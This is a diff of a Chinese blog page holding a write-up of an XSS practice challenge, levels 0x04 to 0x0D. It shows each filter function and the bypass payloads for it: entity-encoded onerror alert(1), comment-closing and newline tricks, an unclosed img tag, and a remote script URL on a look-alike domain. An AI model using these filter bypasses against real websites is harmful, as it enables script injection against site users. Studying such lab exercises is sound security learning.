@@ -7,7 +7,7 @@
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://lwhaleee.github.io/images/Hexo-Theme-MEOW.png">
 <meta property="article:published_time" content="2026-01-27T07:05:39.000Z">
-<meta property="article:modified_time" content="2026-01-29T02:20:07.272Z">
+<meta property="article:modified_time" content="2026-01-29T10:23:32.831Z">
 <meta property="article:author" content="LwhalE">
 <meta property="article:tag" content="web">
 <meta name="twitter:card" content="summary_large_image">
@@ -81,21 +81,21 @@
 
 
 <h3 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h3><p>编码方式同上</p>
-<pre><code class="language-html">&lt;img src=0 onerror=&amp;#x61;&amp;#x6C;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x31;&amp;#x29;&gt;
+<pre><code class="language-text">&lt;img src=0 onerror=&amp;#x61;&amp;#x6C;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x31;&amp;#x29;&gt;
 </code></pre>
 <h3 id="0x05"><a href="#0x05" class="headerlink" title="0x05"></a>0x05</h3><p>单行注释符被替换</p>
 <p>但是可以用多行注释符闭合</p>
-<pre><code class="language-html">--!&gt;&lt;script&gt;alert(1)&lt;/script&gt;
+<pre><code class="language-text">--!&gt;&lt;script&gt;alert(1)&lt;/script&gt;
 </code></pre>
-<h3 id="0x06"><a href="#0x06" class="headerlink" title="0x06"></a>0x06</h3><pre><code class="language-javascript">input = input.replace(/auto|on.*=|&gt;/ig, &#39;_&#39;)
+<h3 id="0x06"><a href="#0x06" class="headerlink" title="0x06"></a>0x06</h3><pre><code class="language-text">input = input.replace(/auto|on.*=|&gt;/ig, &#39;_&#39;)
 </code></pre>
 <p>不能闭合了，所以只能用图片报错来</p>
 <p>这里的on匹配不是直接和等号<a target="_blank" rel="noopener" href="https://blog.csdn.net/zzrshuiwuhen/article/details/8880751">匹配</a>的，<code>on.*=/ig</code> 会匹配 on 字符后面除了换行符以外的任何字符后的等号</p>
 <p>这里感觉和C语言的输入替换有点像，和<code>%*c</code>那个一样，但是C的可以用于处理换行符，这里利用的是不能替代换行符</p>
-<pre><code class="language-html">type=&quot;image&quot; src=&quot;x&quot; onerror
+<pre><code class="language-text">type=&quot;image&quot; src=&quot;x&quot; onerror
 =&quot;alert(1)&quot;
 </code></pre>
-<h3 id="0x07"><a href="#0x07" class="headerlink" title="0x07"></a>0x07</h3><pre><code class="language-javascript">function render (input) &amp;#123;
+<h3 id="0x07"><a href="#0x07" class="headerlink" title="0x07"></a>0x07</h3><pre><code class="language-text">function render (input) &amp;#123;
   const stripTagsRe = /&lt;\/?[^&gt;]+&gt;/gi
 
   input = input.replace(stripTagsRe, &#39;&#39;)
@@ -104,19 +104,18 @@
 </code></pre>
 <p>html即使没有右边尖括号依旧可以执行</p>
 <p>过滤了 <code>&lt;任意大于 0 个的除了右尖括号以外的字符&gt;</code> 和 <code>&lt;/任意大于 0 个的除了右尖括号以外的字符&gt;</code> 这样的结构</p>
-<pre><code class="language-html">&lt;img src=&quot;x&quot; onerror=&quot;alert(1)&quot;
+<pre><code class="language-text">&lt;img src=&quot;x&quot; onerror=&quot;alert(1)&quot;
 </code></pre>
-<p>正则表达式还需要学习一下</p>
 <h3 id="0x08"><a href="#0x08" class="headerlink" title="0x08"></a>0x08</h3><p>直接用会被替换</p>
 <p> HTML 标签在文字与右尖括号之间的空格不会影响解析，因此使用空格绕过</p>
 <p>换行符也可以</p>
-<pre><code class="language-html">&lt;/style &gt;&lt;script&gt;alert(1)&lt;/script&gt;
+<pre><code class="language-text">&lt;/style &gt;&lt;script&gt;alert(1)&lt;/script&gt;
 或者
 &lt;/style
 &gt;&lt;script&gt;alert(1)&lt;/script&gt;
 </code></pre>
 <h3 id="0x09"><a href="#0x09" class="headerlink" title="0x09"></a>0x09</h3><p>必须包含http的部分</p>
-<pre><code class="language-javascript">function render (input) &amp;#123;
+<pre><code class="language-text">function render (input) &amp;#123;
   let domainRe = /^https?:\/\/www\.segmentfault\.com/
   if (domainRe.test(input)) &amp;#123;
     return `&lt;script src=&quot;$&amp;#123;input&amp;#125;&quot;&gt;&lt;/script&gt;`
@@ -125,7 +124,7 @@
 &amp;#125;
 </code></pre>
 <p>然后这里需要加入的网址本身就是错误的地址可以直接用<code>onerror</code>，如果是可用的网址，那么就双写</p>
-<h3 id="0x0A"><a href="#0x0A" class="headerlink" title="0x0A"></a>0x0A</h3><pre><code class="language-JavaScript">function render (input) &amp;#123;
+<h3 id="0x0A"><a href="#0x0A" class="headerlink" title="0x0A"></a>0x0A</h3><pre><code class="language-text">function render (input) &amp;#123;
   function escapeHtml(s) &amp;#123;
     return s.replace(/&amp;/g, &#39;&amp;amp;&#39;)
             .replace(/&#39;/g, &#39;&amp;#39;&#39;)
@@ -144,11 +143,11 @@
 </code></pre>
 <p><code>src</code>：指定资源内容，（包括路径或者文件内容之类的）</p>
 <p>这里访问直接就是对应的<code>js</code>文件</p>
-<pre><code>https://www.segmentfault.com.haozi.me/j.js
+<pre><code class="language-text">https://www.segmentfault.com.haozi.me/j.js
 </code></pre>
 <p>使用 @ 会以 @ 前的字符串作为用户名来访问 @ 后面的网址 </p>
 <p>是个新知识，但是这里用@没成功，不知道为什么</p>
-<h3 id="0x0B"><a href="#0x0B" class="headerlink" title="0x0B"></a>0x0B</h3><pre><code class="language-javascript">function render (input) &amp;#123;
+<h3 id="0x0B"><a href="#0x0B" class="headerlink" title="0x0B"></a>0x0B</h3><pre><code class="language-text">function render (input) &amp;#123;
   input = input.toUpperCase()
   return `&lt;h1&gt;$&amp;#123;input&amp;#125;&lt;/h1&gt;`
 &amp;#125;
@@ -160,9 +159,9 @@
 <li>HTML 标签和属性名称不区分大小写</li>
 </ul>
 <p>但是JavaScript解释器是需要分析大小写的所以编码绕过</p>
-<pre><code class="language-html">&lt;img src=1 onerror=&quot;&amp;#x6A;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3A;&amp;#x61;&amp;#x6C;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x31;&amp;#x29;&quot;&gt;
+<pre><code class="language-text">&lt;img src=1 onerror=&quot;&amp;#x6A;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3A;&amp;#x61;&amp;#x6C;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x31;&amp;#x29;&quot;&gt;
 </code></pre>
-<h3 id="0x0C"><a href="#0x0C" class="headerlink" title="0x0C"></a>0x0C</h3><pre><code class="language-JavaScript">function render (input) &amp;#123;
+<h3 id="0x0C"><a href="#0x0C" class="headerlink" title="0x0C"></a>0x0C</h3><pre><code class="language-text">function render (input) &amp;#123;
   input = input.replace(/script/ig, &#39;&#39;)
   input = input.toUpperCase()
   return &#39;&lt;h1&gt;&#39; + input + &#39;&lt;/h1&gt;&#39;
@@ -170,10 +169,10 @@
 </code></pre>
 <p>用<code>img</code>标签或者双写</p>
 <p>payload</p>
-<pre><code class="language-html">&lt;img src=1 onerror=&quot;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;&quot;&gt;
+<pre><code class="language-text">&lt;img src=1 onerror=&quot;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;&quot;&gt;
 </code></pre>
 <p>理论上双写应该可以，但是没成功，为什么</p>
-<h3 id="0x0D"><a href="#0x0D" class="headerlink" title="0x0D"></a>0x0D</h3><pre><code class="language-javascript">function render (input) &amp;#123;
+<h3 id="0x0D"><a href="#0x0D" class="headerlink" title="0x0D"></a>0x0D</h3><pre><code class="language-text">function render (input) &amp;#123;
   input = input.replace(/[&lt;/&quot;&#39;]/g, &#39;&#39;)
   return `
     &lt;script&gt;
